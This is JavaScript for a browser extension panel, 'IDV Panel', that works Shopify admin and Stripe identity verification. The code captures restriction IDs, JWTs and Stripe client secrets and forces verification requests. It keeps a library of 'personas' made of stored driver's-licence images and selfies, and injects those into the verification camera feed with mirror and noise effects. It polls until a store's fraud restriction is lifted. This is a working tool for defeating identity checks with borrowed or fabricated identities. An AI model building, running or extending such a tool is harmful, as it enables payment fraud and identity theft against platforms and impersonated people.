// IDV Panel — Side Panel Logic v0.6.0

const STEPS_DEF = [
  { id:1, label:'Discovery',      hint:'Go to /balance/account — captures bankAccountId + restriction',  done: s => !!s.bank_account_id },
  { id:2, label:'PGRR / JWT',     hint:'Click "Verify identity" OR press Force button above',            done: s => !!s.jwt },
  { id:3, label:'EK (Stripe key)',hint:'Stripe modal opens — extension captures EK automatically',       done: s => !!s.ek },
  { id:4, label:'Stripe Submit',  hint:'Upload DL + selfie on verify.stripe.com (or use auto-submit)',   done: s => ['processing','verified','succeeded'].includes(s.stripe_session_status) },
  { id:5, label:'Discharge',      hint:'Poll running — waiting for restriction to become INACTIVE',      done: s => !!s.discharge_detected },
]

const EVENT_COLORS = {
  banking_home:'banking', pgrr_jwt_minted:'pgrr', remediate_risk_restriction:'remediate',
  civa_ek_minted:'civa', vhub_assessment_created:'civa',
  stripe_session_update:'stripe', stripe_submit_result:'stripe',
  discharge_detected:'discharge', poll_still_active:'poll',
}

let currentStore   = null
let currentSession = null
let pollActive     = false
let pollCount      = 0
let uiRefreshTimer = null

const ADJ = { zoom: 1.08, offX: 0, offY: 0 }

// ── Tab navigation ─────────────────────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'))
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'))
    tab.classList.add('active')
    document.getElementById('tab-' + tab.dataset.tab).classList.add('active')
    if (tab.dataset.tab === 'events') renderEvents()
    if (tab.dataset.tab === 'stores') renderStores()
  })
})

// ── Time helpers ──────────────────────────────────────────────────────────────
function ago(ts) {
  if (!ts) return ''
  const s = Math.floor((Date.now() - ts) / 1000)
  if (s < 5)  return 'just now'
  if (s < 60) return s + 's ago'
  if (s < 3600) return Math.floor(s/60) + 'm ago'
  return Math.floor(s/3600) + 'h ago'
}

function shortAgo(ts) {
  if (!ts) return ''
  const s = Math.floor((Date.now() - ts) / 1000)
  if (s < 60) return s + 's'
  if (s < 3600) return Math.floor(s/60) + 'm'
  return Math.floor(s/3600) + 'h'
}

// ── File helpers ──────────────────────────────────────────────────────────────
function fileToB64(file) {
  return new Promise((resolve, reject) => {
    const r = new FileReader()
    r.onload = e => resolve(e.target.result)
    r.onerror = reject
    r.readAsDataURL(file)
  })
}

function setupFileInput(inputId, slotId, previewId, storageKey) {
  const input   = document.getElementById(inputId)
  const slot    = document.getElementById(slotId)
  const preview = document.getElementById(previewId)
  if (!input) return

  chrome.storage.local.get([storageKey], r => {
    if (r[storageKey]) {
      preview.src = r[storageKey]; preview.classList.add('show')
      slot.classList.add('has-file')
      slot.querySelector('.doc-slot-label').textContent = '✓ Ready'
      obsRefreshMedia(r[storageKey])
    }
  })

  input.addEventListener('change', async e => {
    const file = e.target.files[0]; if (!file) return
    const b64 = await fileToB64(file)
    await chrome.storage.local.set({ [storageKey]: b64 })
    preview.src = b64; preview.classList.add('show')
    slot.classList.add('has-file')
    slot.querySelector('.doc-slot-label').textContent = '✓ Ready'
    obsRefreshMedia(b64)
    updateStripeButton()
  })
}

function setupMediaSlot(inputId, slotId, imgId, vidId, storageKey, label) {
  const input   = document.getElementById(inputId)
  const slot    = document.getElementById(slotId)
  const imgPrev = document.getElementById(imgId)
  const vidPrev = document.getElementById(vidId)
  if (!input || !slot) return

  function showPreview(src) {
    const isVid = src?.startsWith('data:video/')
    if (isVid) {
      vidPrev.src = src; vidPrev.classList.add('show'); imgPrev.classList.remove('show')
      vidPrev.play().catch(() => {})
      slot.querySelector('.doc-slot-label').textContent = '✓ Video'
    } else if (src) {
      imgPrev.src = src; imgPrev.classList.add('show'); vidPrev.classList.remove('show')
      slot.querySelector('.doc-slot-label').textContent = '✓ Image'
    } else {
      slot.querySelector('.doc-slot-label').textContent = label
    }
  }

  chrome.storage.local.get([storageKey], r => {
    if (r[storageKey]) { showPreview(r[storageKey]); slot.classList.add('has-file') }
  })

  input.addEventListener('change', async e => {
    const file = e.target.files[0]; if (!file) return
    const b64 = await fileToB64(file)
    await chrome.storage.local.set({ [storageKey]: b64 })
    showPreview(b64); slot.classList.add('has-file')
    obsRefreshMedia(b64)
  })
}

// ── Init ──────────────────────────────────────────────────────────────────────
async function init() {
  setupFileInput('inputFront', 'slotFront', 'prevFront', 'dl_front')
  setupFileInput('inputBack',  'slotBack',  'prevBack',  'dl_back')
  setupMediaSlot('inputS0','slotS0','prevS0','vidS0','selfie_0','Slot 1')
  setupMediaSlot('inputS1','slotS1','prevS1','vidS1','selfie_1','Slot 2')
  setupMediaSlot('inputS2','slotS2','prevS2','vidS2','selfie_2','Slot 3')

  await detectStore()
  await render()
  await loadPersonas()
  await refreshPollState()

  // Storage changes
  chrome.storage.onChanged.addListener(async changes => {
    if (changes.sessions) {
      const sessions = changes.sessions.newValue || {}
      currentSession = currentStore ? sessions[currentStore] : null
      await render()
      if (document.querySelector('.tab[data-tab="events"]')?.classList.contains('active')) renderEvents()
      if (document.querySelector('.tab[data-tab="stores"]')?.classList.contains('active')) renderStores()
    }
    if (changes.personas) loadPersonas()
  })

  // Tab / navigation changes
  chrome.tabs.onUpdated.addListener(async (_, info) => {
    if (info.status === 'complete') { await detectStore(); await render() }
  })
  chrome.tabs.onActivated.addListener(async () => { await detectStore(); await render() })

  // Background messages (poll ticks, stripe status)
  chrome.runtime.onMessage.addListener(msg => {
    if (msg.type === 'POLL_STATE_CHANGED') {
      pollActive = msg.active
      if (msg.meta) pollCount = msg.meta.count || 0
      renderPollBar()
    }
    if (msg.type === 'POLL_TICK') {
      if (msg.meta) pollCount = msg.meta.count || 0
      renderPollBar()
    }
    if (msg.type === 'AUTO_STATUS') {
      showAutoBar(msg.step, msg.msg)
      // Also refresh steps if session updated
      if (['jwt_ok','stripe_done','discharged','discover_ok'].includes(msg.step)) render()
    }
    if (msg.type === 'SESSION_UPDATED') {
      if (!currentStore || msg.store === currentStore) render()
    }
    if (msg.type === 'STRIPE_STATUS_UPDATE') {
      const el = document.getElementById('stripeStatus')
      el.textContent = '🟣 Stripe: ' + msg.status
      el.classList.add('visible')
      showAutoBar('stripe_submit', '🟣 Stripe: ' + msg.status)
    }
    if (msg.type === 'STRIPE_MODAL_DETECTED') {
      const reasonMap = {
        popup:          'Popup detected — click Start on Shopify OR use Force Verify below',
        account_review: 'Account Review page — use Force Verify button below',
        flagged_page:   'Store is flagged — press Force Verify to start IDV'
      }
      showModalAlert(msg.store, reasonMap[msg.reason] || 'Use Force Verify below')
    }
    if (msg.type === 'PAGE_CONTEXT') {
      if (msg.store && msg.store !== currentStore) {
        currentStore = msg.store
        render()
      }
      // Highlight the relevant step based on page
      const pageHints = {
        balance:        'Step 1: Go to Balance page — restriction data will be captured automatically',
        account_review: 'Step 2: Click Force Verify to get the JWT token',
        payments:       'Step 2: Go to Payments → Verify Identity section'
      }
      const hint = pageHints[msg.page]
      if (hint) {
        const el = document.getElementById('pageContextHint')
        if (el) { el.textContent = hint; el.style.display = 'block' }
      }
    }
  })

  // Button wiring
  document.getElementById('btnForce').addEventListener('click', doForceVerify)
  document.getElementById('btnStripe').addEventListener('click', doOpenStripe)
  document.getElementById('btnExport').addEventListener('click', doExport)
  document.getElementById('btnClear').addEventListener('click', doClear)
  document.getElementById('btnPollStop').addEventListener('click', doStopPoll)
  document.getElementById('btnPollNow').addEventListener('click', doPollNow)
  document.getElementById('btnCopyAll').addEventListener('click', doCopyAll)
  document.getElementById('btnClearEvents').addEventListener('click', doClearEvents)
  document.getElementById('btnSavePersona').addEventListener('click', doSavePersona)
  document.getElementById('btnNavBalance').addEventListener('click', () => openAdminPage('balance/account'))
  document.getElementById('btnNavPayments').addEventListener('click', () => openAdminPage('settings/payments'))
  document.getElementById('btnNavStripeNew').addEventListener('click', doOpenStripeNew)

  // Camera switcher
  document.getElementById('camBtnFront').addEventListener('click',  () => switchCam('front'))
  document.getElementById('camBtnBack').addEventListener('click',   () => switchCam('back'))
  document.getElementById('camBtnSelfie').addEventListener('click', () => switchCam('selfie'))

  // OBS preview
  setupOBSPreview()
  setupAdjSlider('adjZoom','adjZoomVal', v => v+'%', v => { ADJ.zoom = parseInt(v)/100; sendAdjust(); obsRender() })
  document.getElementById('adjReset').addEventListener('click', resetAdj)

  let mirrorOn = true, noiseOn = true
  document.getElementById('toggleMirror').addEventListener('click', () => {
    mirrorOn = !mirrorOn
    const b = document.getElementById('toggleMirror')
    b.textContent = '🪞 Mirror: ' + (mirrorOn ? 'ON' : 'OFF')
    b.className = 'cam-btn' + (mirrorOn ? ' active' : '')
    sendToggle({ mirror: mirrorOn })
  })
  document.getElementById('toggleNoise').addEventListener('click', () => {
    noiseOn = !noiseOn
    const b = document.getElementById('toggleNoise')
    b.textContent = '📺 Noise: ' + (noiseOn ? 'ON' : 'OFF')
    b.className = 'cam-btn' + (noiseOn ? ' active' : '')
    sendToggle({ noise: noiseOn })
  })

  // Live clock for "ago" timestamps
  uiRefreshTimer = setInterval(() => {
    const upd = document.getElementById('badgeUpdated')
    if (upd && currentSession?.updated_at) upd.textContent = ago(currentSession.updated_at)
  }, 10000)
}

// ── Store detection ───────────────────────────────────────────────────────────
async function detectStore() {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true })
  const url  = tabs[0]?.url || ''
  const m    = url.match(/\/store\/([^/?#]+)/)
  currentStore = m?.[1] || null
  const r = await chrome.storage.local.get(['sessions'])
  currentSession = currentStore ? (r.sessions || {})[currentStore] : null
}

async function refreshPollState() {
  if (!currentStore) return
  chrome.runtime.sendMessage({ type:'GET_POLL_STATE', store: currentStore }, res => {
    pollActive = res?.active || false
    pollCount  = res?.meta?.count || 0
    renderPollBar()
  })
}

// ── Render ────────────────────────────────────────────────────────────────────
async function render() {
  const state      = currentSession?.state || {}
  const hasSession = !!currentSession
  const hasStore   = !!currentStore

  // Header
  document.getElementById('hdrStore').textContent = currentStore || 'IDV Panel'
  document.getElementById('hdrSub').textContent   = hasSession
    ? `${currentSession.events?.length || 0} events · updated ${ago(currentSession.updated_at)}`
    : (hasStore ? 'no data yet' : 'no store detected')
  document.getElementById('btnExport').style.display = hasSession ? 'inline-block' : 'none'
  document.getElementById('btnClear').style.display  = hasSession ? 'inline-block' : 'none'

  // Progress bar
  const steps   = STEPS_DEF.filter(s => s.done(state)).length
  const pct     = Math.round((steps / STEPS_DEF.length) * 100)
  const pwrap   = document.getElementById('progressWrap')
  const pfill   = document.getElementById('progressFill')
  const ppct    = document.getElementById('progressPct')
  if (hasStore) {
    pwrap.style.display = 'block'
    pfill.style.width   = pct + '%'
    pfill.className     = 'progress-fill' + (steps === STEPS_DEF.length ? ' done' : '')
    ppct.textContent    = pct + '% (' + steps + '/' + STEPS_DEF.length + ')'
  } else {
    pwrap.style.display = 'none'
  }

  // Status badge
  const badge      = document.getElementById('statusBadge')
  const isActive   = state.active_restriction_status === 'ACTIVE'
  const isDischarged = !!state.discharge_detected
  if (state.active_restriction_id) {
    badge.className = 'status-badge ' + (isDischarged ? 'discharged' : isActive ? 'active' : '')
    document.getElementById('restrictionId').textContent    = state.active_restriction_id
    document.getElementById('restrictionLabel').textContent = isDischarged ? '✓ DISCHARGED' : isActive ? '● ACTIVE' : ''
    document.getElementById('badgeUpdated').textContent     = ago(currentSession?.updated_at)
    document.getElementById('badgePollCount').textContent   = pollCount > 0 ? `${pollCount} polls` : ''
  } else {
    badge.className = 'status-badge'
  }

  // Force verify button — show on any Shopify admin page even without restriction ID yet
  const showForce = currentStore && !state.jwt && !isDischarged
  const btnF = document.getElementById('btnForce')
  btnF.className = 'btn-force' + (showForce ? ' visible' : '')
  // Update button label: show "Discover + Force Verify" if no restriction ID
  if (showForce) {
    btnF.textContent = state.active_restriction_id
      ? '▶ Force Verify (PGRR)'
      : '🔍 Discover + Force Verify'
  }

  // Quick nav
  document.getElementById('quickNav').style.display = hasStore ? 'block' : 'none'

  // Stripe button
  await updateStripeButton()

  // Steps
  renderSteps(state)

  // Tokens
  renderTokens(state)

  // Poll bar
  await refreshPollState()

  // Empty state
  document.getElementById('emptyState').style.display = (!hasStore && !hasSession) ? 'block' : 'none'

  // How-to guide step highlights
  updateGuideSteps(state)
}

function updateGuideSteps(state) {
  const r = chrome.storage.local.get(['dl_front','dl_back'], docs => {
    const hasDocs = !!(docs?.dl_front && docs?.dl_back)
    const hasRid  = !!(state.active_restriction_id)
    const hasJwt  = !!(state.jwt)
    const hasStripe = ['processing','verified','succeeded'].includes(state.stripe_session_status)
    const done    = !!(state.discharge_detected)

    const steps = [
      { id:'gs1', done: hasDocs,   active: !hasDocs },
      { id:'gs2', done: hasRid,    active: hasDocs && !hasRid },
      { id:'gs3', done: hasJwt,    active: hasRid && !hasJwt },
      { id:'gs4', done: hasStripe, active: hasJwt && !hasStripe },
      { id:'gs5', done: done,      active: hasStripe && !done },
    ]
    steps.forEach(s => {
      const el = document.getElementById(s.id)
      if (!el) return
      el.className = 'guide-step' + (s.done ? ' done' : s.active ? ' active' : '')
    })
  })
}

function renderSteps(state) {
  let currentStep = 0
  for (let i = 0; i < STEPS_DEF.length; i++) {
    if (STEPS_DEF[i].done(state)) currentStep = i + 1
    else break
  }
  const container = document.getElementById('steps')
  container.innerHTML = ''
  STEPS_DEF.forEach((step, i) => {
    const done      = i < currentStep
    const isCurrent = i === currentStep
    const div       = document.createElement('div')
    div.className   = 'step ' + (done ? 'done' : isCurrent ? 'current' : 'pending')
    div.innerHTML = `
      <div class="step-icon">${done ? '✓' : isCurrent ? '●' : '○'}</div>
      <div class="step-body">
        <div class="step-label">${step.id}. ${step.label}${isCurrent ? ' <span style="color:#1d4ed8;font-size:10px;font-weight:400">← now</span>' : ''}</div>
        ${isCurrent ? `<div class="step-hint">${step.hint}</div>` : ''}
      </div>`
    container.appendChild(div)
  })
}

function renderTokens(state) {
  const rows = [
    { key:'bankAcctId',   val: state.bank_account_id },
    { key:'principalId',  val: state.principal_id },
    { key:'restrictId',   val: state.active_restriction_id },
    { key:'JWT',          val: state.jwt,              short: true },
    { key:'EK',           val: state.ek },
    { key:'clientSecret', val: state.ek_client_secret, short: true },
    { key:'assessRef',    val: state.assessment_ref || state.vhub_assessment_ref },
    { key:'civaVariant',  val: state.civa_variant },
    { key:'stripeStatus', val: state.stripe_session_status },
  ].filter(r => !!r.val)

  const section = document.getElementById('tokensSection')
  const list    = document.getElementById('tokenList')
  section.style.display = rows.length ? 'block' : 'none'
  list.innerHTML = ''

  rows.forEach(r => {
    const display = r.short && r.val.length > 40 ? r.val.slice(0,24) + '…' + r.val.slice(-8) : r.val
    const div = document.createElement('div')
    div.className = 'token-row'
    div.innerHTML = `
      <span class="token-key">${r.key}</span>
      <span class="token-val" title="${r.val}">${display}</span>
      <button class="token-copy" data-val="${r.val}" title="Copy">⎘</button>`
    list.appendChild(div)
  })

  list.querySelectorAll('.token-copy').forEach(btn => {
    btn.addEventListener('click', () => {
      navigator.clipboard.writeText(btn.dataset.val).then(() => {
        const o = btn.textContent; btn.textContent = '✓'; btn.style.color = '#22c55e'
        setTimeout(() => { btn.textContent = o; btn.style.color = '' }, 1500)
      })
    })
  })
}

function renderPollBar() {
  const bar = document.getElementById('pollBar')
  bar.className = 'poll-bar' + (pollActive ? ' active' : '')
  document.getElementById('pollMeta').textContent = pollCount > 0 ? `#${pollCount}` : ''
}

function renderEvents() {
  const events  = [...(currentSession?.events || [])].reverse().slice(0, 80)
  const list    = document.getElementById('eventsList')
  const empty   = document.getElementById('eventsEmpty')
  const title   = document.getElementById('eventsTitle')

  if (!events.length) {
    empty.style.display = 'block'; list.innerHTML = ''
    list.appendChild(empty)
    title.childNodes[0].textContent = 'Events '
    return
  }
  empty.style.display = 'none'
  title.childNodes[0].textContent = `Events (${currentSession?.events?.length || 0}) `

  list.innerHTML = ''
  events.forEach(ev => {
    const evName = ev._event || '?'
    const color  = EVENT_COLORS[evName] || ''
    const div = document.createElement('div')
    div.className = 'ev-row ' + color
    div.innerHTML = `
      <span class="ev-time">${shortAgo(ev.timestamp)}</span>
      <span class="ev-name">${evName}</span>
      <span class="ev-scope">${ev._scope || ''}</span>`
    list.appendChild(div)
  })
}

function renderStores() {
  chrome.storage.local.get(['sessions'], r => {
    const sessions = r.sessions || {}
    const entries  = Object.entries(sessions)
    const storeList = document.getElementById('storeList')
    const storesEmpty = document.getElementById('storesEmpty')

    if (!entries.length) {
      storesEmpty.style.display = 'block'
      storeList.innerHTML = ''
      storeList.appendChild(storesEmpty)
      return
    }
    storesEmpty.style.display = 'none'
    storeList.innerHTML = ''

    entries.sort((a, b) => (b[1].updated_at || 0) - (a[1].updated_at || 0)).forEach(([store, sess]) => {
      const state      = sess.state || {}
      const steps      = STEPS_DEF.filter(s => s.done(state)).length
      const discharged = !!state.discharge_detected
      const active     = state.active_restriction_status === 'ACTIVE'
      const isCurrent  = store === currentStore

      const div = document.createElement('div')
      div.className = 'store-card' + (isCurrent ? ' current' : discharged ? ' discharged' : '')
      div.innerHTML = `
        <div class="sc-row">
          <span class="sc-name">${store}</span>
          <div class="sc-right">
            <span class="sc-steps">${steps}/5</span>
            <span class="sc-dot">${discharged ? '✅' : active ? '🔴' : '⚫'}</span>
          </div>
        </div>
        <div class="sc-meta">
          ${state.active_restriction_id ? `<span>#${state.active_restriction_id}</span>` : ''}
          <span>${ago(sess.updated_at)}</span>
        </div>`
      div.addEventListener('click', async () => {
        currentStore = store
        currentSession = sess
        await render()
        document.querySelector('.tab[data-tab="main"]').click()
      })
      storeList.appendChild(div)
    })
  })
}

// ── Stripe button ─────────────────────────────────────────────────────────────
async function updateStripeButton() {
  const state    = currentSession?.state || {}
  const hasEK    = !!state.ek_client_secret
  const r        = await chrome.storage.local.get(['dl_front','dl_back'])
  const hasDocs  = !!r.dl_front && !!r.dl_back
  const isDisch  = !!state.discharge_detected
  document.getElementById('btnStripe').className = 'btn-stripe' + (hasEK && hasDocs && !isDisch ? ' visible' : '')
}

// ── Actions ───────────────────────────────────────────────────────────────────
async function doForceVerify() {
  if (!currentStore) return
  const btn    = document.getElementById('btnForce')
  const errDiv = document.getElementById('forceError')
  errDiv.className = 'force-error'

  let state = currentSession?.state || {}
  let rid   = state.active_restriction_gid || state.active_restriction_id

  // Step A: Auto-discover restriction ID if not found
  if (!rid) {
    btn.textContent = '🔍 Finding restriction ID…'
    btn.className = 'btn-force visible loading'
    showAutoBar('discover', '🔍 Running Discovery query on Shopify admin...')

    const found = await new Promise(resolve =>
      chrome.runtime.sendMessage({ type: 'AUTO_DISCOVER', store: currentStore }, r => resolve(r?.restrictionId || null))
    )

    if (!found) {
      // Wait 2s for patcher to capture via fetch hook
      await new Promise(r => setTimeout(r, 2500))
      const freshSess = await new Promise(resolve =>
        chrome.runtime.sendMessage({ type: 'GET_SESSION', store: currentStore }, r => resolve(r?.session))
      )
      state = freshSess?.state || {}
      rid   = state.active_restriction_gid || state.active_restriction_id || found
    } else {
      rid = found
    }

    if (!rid) {
      btn.textContent = '✕ No restriction found — go to Balance page'
      btn.className = 'btn-force visible error'
      errDiv.textContent = 'Could not find restriction ID. Click "Balance Page" in Quick Nav, wait 2s, then try again.'
      errDiv.className = 'force-error visible'
      showAutoBar('discover_fail', '❌ Restriction not found — click Balance Page in Quick Nav then retry')
      return
    }

    showAutoBar('discover_ok', `🔍 Restriction found! Running Force Verify...`)
  }

  // Step B: Run Force Verify (PGRR mutation)
  btn.textContent = '⬡ Running PGRR…'
  btn.className = 'btn-force visible loading'

  chrome.runtime.sendMessage({ type:'FORCE_VERIFY', riskRestrictionId: rid }, res => {
    if (chrome.runtime.lastError || !res?.ok) {
      btn.textContent = '✕ Error — tap to retry'
      btn.className = 'btn-force visible error'
      errDiv.textContent = res?.error || chrome.runtime.lastError?.message || 'unknown error'
      errDiv.className = 'force-error visible'
      showAutoBar('pgrr_fail', '❌ PGRR failed: ' + (res?.error || 'unknown'))
    } else {
      btn.textContent = '✓ JWT captured! Opening Stripe…'
      btn.className = 'btn-force visible success'
      showAutoBar('jwt_ok', '🔑 JWT captured! Stripe will open automatically...')
      setTimeout(() => render(), 800)
    }
  })
}

async function doOpenStripe() {
  const state = currentSession?.state || {}
  if (!state.ek_client_secret) return
  const r = await chrome.storage.local.get(['dl_front','dl_back','selfie_0','selfie_1','selfie_2'])
  const selfies = [r.selfie_0, r.selfie_1, r.selfie_2].filter(Boolean)
  await chrome.storage.local.set({ selfies })
  chrome.runtime.sendMessage({ type:'OPEN_STRIPE', clientSecret: state.ek_client_secret, store: currentStore }, res => {
    if (!res?.ok) alert('Error opening Stripe: ' + (res?.error || 'unknown'))
  })
}

async function doOpenStripeNew() {
  const state = currentSession?.state || {}
  if (!state.ek_client_secret) { alert('No EK captured yet — complete step 3 first'); return }
  const url = `https://verify.stripe.com/verify/${state.ek_client_secret}`
  chrome.tabs.create({ url, active: true })
}

function openAdminPage(path) {
  if (!currentStore) return
  const url = `https://admin.shopify.com/store/${currentStore}/${path}`
  chrome.tabs.query({ url: 'https://admin.shopify.com/*' }, tabs => {
    if (tabs[0]) chrome.tabs.update(tabs[0].id, { url, active: true })
    else chrome.tabs.create({ url, active: true })
  })
}

function doExport() {
  if (!currentSession) return
  const blob = new Blob([JSON.stringify(currentSession, null, 2)], { type:'application/json' })
  const url  = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url; a.download = `idv-${currentSession.store}-${Date.now()}.json`; a.click()
  URL.revokeObjectURL(url)
}

function doClear() {
  if (!currentStore) return
  if (!confirm(`Clear session for "${currentStore}"?`)) return
  chrome.runtime.sendMessage({ type:'CLEAR_SESSION', store: currentStore })
  currentSession = null; render()
}

function doStopPoll() {
  if (!currentStore) return
  chrome.runtime.sendMessage({ type:'STOP_POLL', store: currentStore })
  pollActive = false; renderPollBar()
}

function doPollNow() {
  if (!currentStore || !currentSession?.state?.active_restriction_id) return
  chrome.runtime.sendMessage({
    type:'POLL_NOW', store: currentStore,
    restrictionId: currentSession.state.active_restriction_gid || currentSession.state.active_restriction_id
  })
}

function doCopyAll() {
  const state = currentSession?.state || {}
  const rows  = [
    ['bankAccountId',    state.bank_account_id],
    ['bankAccountGid',   state.bank_account_gid],
    ['principalId',      state.principal_id],
    ['restrictionId',    state.active_restriction_id],
    ['restrictionGid',   state.active_restriction_gid],
    ['jwt',              state.jwt],
    ['jwtType',          state.jwt_type],
    ['ek',               state.ek],
    ['ekClientSecret',   state.ek_client_secret],
    ['assessmentRef',    state.assessment_ref || state.vhub_assessment_ref],
    ['civaVariant',      state.civa_variant],
    ['stripeStatus',     state.stripe_session_status],
    ['discharged',       state.discharge_detected],
  ].filter(([,v]) => v != null && v !== undefined)
  const text = rows.map(([k,v]) => `${k}: ${v}`).join('\n')
  navigator.clipboard.writeText(text).then(() => {
    const b = document.getElementById('btnCopyAll')
    const o = b.textContent; b.textContent = '✓ copied!'; b.style.color = '#22c55e'
    setTimeout(() => { b.textContent = o; b.style.color = '' }, 1800)
  })
}

function doClearEvents() {
  if (!currentSession || !currentStore) return
  if (!confirm('Clear event log for ' + currentStore + '?')) return
  currentSession.events = []
  chrome.storage.local.get(['sessions'], r => {
    const s = r.sessions || {}
    if (s[currentStore]) s[currentStore].events = []
    chrome.storage.local.set({ sessions: s })
  })
  renderEvents()
}

// ── Camera switcher ───────────────────────────────────────────────────────────
async function switchCam(mode) {
  document.getElementById('camBtnFront').className  = 'cam-btn' + (mode === 'front'  ? ' active' : '')
  document.getElementById('camBtnBack').className   = 'cam-btn' + (mode === 'back'   ? ' active' : '')
  document.getElementById('camBtnSelfie').className = 'cam-btn' + (mode === 'selfie' ? ' active' : '')

  const phase  = mode === 'selfie' ? 'selfie' : 'id'
  const idStep = mode === 'back' ? 1 : 0
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true })
  if (!tabs[0]?.id) return
  chrome.scripting.executeScript({
    target: { tabId: tabs[0].id, allFrames: true }, world: 'MAIN',
    func: (phase, idStep) => window.postMessage({ _idv:'IDV_SWITCH', phase, idStep }, '*'),
    args: [phase, idStep]
  }).catch(() => {})

  const key = mode === 'front' ? 'dl_front' : mode === 'back' ? 'dl_back' : 'selfie_0'
  chrome.storage.local.get([key], r => { if (r[key]) obsRefreshMedia(r[key]) })
}

function sendToggle(opts) {
  chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
    if (!tabs[0]?.id) return
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id, allFrames: true }, world: 'MAIN',
      func: (o) => window.postMessage({ _idv:'IDV_TOGGLE', ...o }, '*'), args: [opts]
    }).catch(() => {})
  })
}

// ── Persona library ───────────────────────────────────────────────────────────
async function loadPersonas() {
  const r = await chrome.storage.local.get(['personas'])
  const personas = r.personas || []
  const list  = document.getElementById('personaList')
  const empty = document.getElementById('personaEmpty')
  list.innerHTML = ''
  if (!personas.length) { list.appendChild(empty); return }
  empty.style.display = 'none'

  personas.forEach((p, idx) => {
    const hasFront = !!p.dl_front, hasBack = !!p.dl_back
    const hasSelfies = [p.selfie_0, p.selfie_1, p.selfie_2].filter(Boolean).length
    const card = document.createElement('div')
    card.className = 'persona-card'
    card.innerHTML = `
      <span class="persona-name" title="${p.name}">${p.name}</span>
      <div class="persona-dots">
        <div class="persona-dot ${hasFront ? 'on' : ''}" title="DL Front"></div>
        <div class="persona-dot ${hasBack ? 'on' : ''}" title="DL Back"></div>
        <div class="persona-dot ${hasSelfies > 0 ? 'on' : ''}" title="Selfies (${hasSelfies})"></div>
      </div>
      <div class="persona-actions">
        <button class="btn-persona-load">Load</button>
        <button class="btn-persona-del">✕</button>
      </div>`
    card.querySelector('.btn-persona-load').addEventListener('click', () => loadPersona(p))
    card.querySelector('.btn-persona-del').addEventListener('click', () => deletePersona(idx))
    list.appendChild(card)
  })
}

async function doSavePersona() {
  const name = prompt('Persona name (e.g. "John Smith"):')
  if (!name?.trim()) return
  const r = await chrome.storage.local.get(['dl_front','dl_back','selfie_0','selfie_1','selfie_2','personas'])
  const personas = r.personas || []
  personas.push({
    name: name.trim(),
    dl_front:  r.dl_front  || null,
    dl_back:   r.dl_back   || null,
    selfie_0:  r.selfie_0  || null,
    selfie_1:  r.selfie_1  || null,
    selfie_2:  r.selfie_2  || null,
    savedAt:   Date.now()
  })
  await chrome.storage.local.set({ personas })
  await loadPersonas()
}

async function loadPersona(p) {
  const toSet = {}
  if (p.dl_front)  toSet.dl_front  = p.dl_front
  if (p.dl_back)   toSet.dl_back   = p.dl_back
  if (p.selfie_0)  toSet.selfie_0  = p.selfie_0
  if (p.selfie_1)  toSet.selfie_1  = p.selfie_1
  if (p.selfie_2)  toSet.selfie_2  = p.selfie_2
  await chrome.storage.local.set(toSet)
  // Refresh previews
  if (p.dl_front) {
    const slot = document.getElementById('slotFront')
    const prev = document.getElementById('prevFront')
    prev.src = p.dl_front; prev.classList.add('show')
    slot.classList.add('has-file')
    slot.querySelector('.doc-slot-label').textContent = '✓ Ready'
  }
  if (p.dl_back) {
    const slot = document.getElementById('slotBack')
    const prev = document.getElementById('prevBack')
    prev.src = p.dl_back; prev.classList.add('show')
    slot.classList.add('has-file')
    slot.querySelector('.doc-slot-label').textContent = '✓ Ready'
  }
  if (p.dl_front) obsRefreshMedia(p.dl_front)
  updateStripeButton()
  alert(`Persona "${p.name}" loaded!`)
}

async function deletePersona(idx) {
  const r = await chrome.storage.local.get(['personas'])
  const personas = r.personas || []
  personas.splice(idx, 1)
  await chrome.storage.local.set({ personas })
  await loadPersonas()
}

// ── OBS preview ───────────────────────────────────────────────────────────────
let obsCurrentSrc = null, obsKind = 'image'

function obsRefreshMedia(src) {
  if (!src) return
  obsCurrentSrc = src
  obsKind = src.startsWith('data:video/') ? 'video' : 'image'
  const img = document.getElementById('obsImg'), vid = document.getElementById('obsVid')
  const badge = document.getElementById('obsBadge')
  if (obsKind === 'video') {
    vid.src = src; vid.style.display = ''; vid.play().catch(() => {})
    img.style.display = 'none'
  } else {
    img.src = src; img.style.display = ''
    if (vid) { vid.pause(); vid.style.display = 'none' }
  }
  if (badge) badge.textContent = ''
  obsRender()
}

function obsRender() {
  const wrap = document.getElementById('obsWrap')
  const img  = document.getElementById('obsImg')
  const vid  = document.getElementById('obsVid')
  const target = obsKind === 'video' ? vid : img
  if (!obsCurrentSrc || !target) return
  const wW = wrap.clientWidth || 300, wH = wrap.clientHeight || 169
  const s2p = wW / 1280
  const mW = obsKind === 'video' ? (vid?.videoWidth || 1280) : (img.naturalWidth || 200)
  const mH = obsKind === 'video' ? (vid?.videoHeight || 720) : (img.naturalHeight || 150)
  const baseS = Math.min(1280/mW, 720/mH) * ADJ.zoom * s2p
  const dW = mW * baseS, dH = mH * baseS
  const cx = wW/2 + ADJ.offX * s2p, cy = wH/2 + ADJ.offY * s2p
  target.style.width = dW+'px'; target.style.height = dH+'px'
  target.style.left = (cx-dW/2)+'px'; target.style.top = (cy-dH/2)+'px'
}

function setupOBSPreview() {
  const wrap = document.getElementById('obsWrap')
  const img  = document.getElementById('obsImg')
  const vid  = document.getElementById('obsVid')
  img.addEventListener('load', obsRender)
  if (vid) vid.addEventListener('loadedmetadata', obsRender)
  chrome.storage.local.get(['dl_front'], r => { if (r.dl_front) obsRefreshMedia(r.dl_front) })

  let dragging = false, startX = 0, startY = 0, startOffX = 0, startOffY = 0
  wrap.addEventListener('mousedown', e => {
    dragging = true; startX = e.clientX; startY = e.clientY
    startOffX = ADJ.offX; startOffY = ADJ.offY
    wrap.style.cursor = 'grabbing'; e.preventDefault()
  })
  window.addEventListener('mousemove', e => {
    if (!dragging) return
    const s = 1280 / (wrap.clientWidth || 300)
    ADJ.offX = Math.max(-400, Math.min(400, Math.round(startOffX + (e.clientX-startX)*s)))
